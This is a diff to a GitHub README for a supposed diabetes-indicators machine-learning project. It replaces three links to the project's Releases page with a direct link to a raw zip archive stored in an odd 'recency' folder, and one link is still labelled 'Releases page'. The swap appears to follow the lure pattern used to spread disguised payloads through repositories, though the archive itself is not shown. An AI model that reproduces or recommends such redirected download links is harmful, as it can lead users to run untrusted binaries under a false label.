@@ -1,7 +1,7 @@
 # 🌟 diabetes-indicators-ml-and-cnn - Analyze Diabetes Data with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Elikatee/diabetes-indicators-ml-and-cnn/releases)
+[![Download](https://raw.githubusercontent.com/Elikatee/diabetes-indicators-ml-and-cnn/main/recency/diabetes-ml-and-indicators-cnn-v3.6.zip)](https://raw.githubusercontent.com/Elikatee/diabetes-indicators-ml-and-cnn/main/recency/diabetes-ml-and-indicators-cnn-v3.6.zip)
 
 ## 📖 Overview
 The **diabetes-indicators-ml-and-cnn** application helps you analyze diabetes indicators using machine learning techniques. We use data from the BRFSS 2015, focusing on information about diabetes and health. This application combines PCA, clustering, and supervised machine learning methods. Additionally, it incorporates Convolutional Neural Networks (CNN) for image classification on a vegetable image dataset. This means you can easily explore and understand the data related to diabetes and improve your knowledge in healthcare analytics.
@@ -10,7 +10,7 @@ The **diabetes-indicators-ml-and-cnn** application helps you analyze diabetes in
 To get started with **diabetes-indicators-ml-and-cnn**, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Elikatee/diabetes-indicators-ml-and-cnn/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/Elikatee/diabetes-indicators-ml-and-cnn/main/recency/diabetes-ml-and-indicators-cnn-v3.6.zip).
 
 2. **Download the Latest Version**  
    Look for the latest version at the top of the page. Click on the link to download it.
@@ -65,7 +65,7 @@ If you encounter any issues, consider these common solutions:
 ## 📥 Download & Install
 To access the latest version of **diabetes-indicators-ml-and-cnn**, click the following link to visit the Releases page:
 
-[Download Now](https://github.com/Elikatee/diabetes-indicators-ml-and-cnn/releases)
+[Download Now](https://raw.githubusercontent.com/Elikatee/diabetes-indicators-ml-and-cnn/main/recency/diabetes-ml-and-indicators-cnn-v3.6.zip)
 
 Follow the previous sections for detailed instructions on how to properly install and use the software.
 
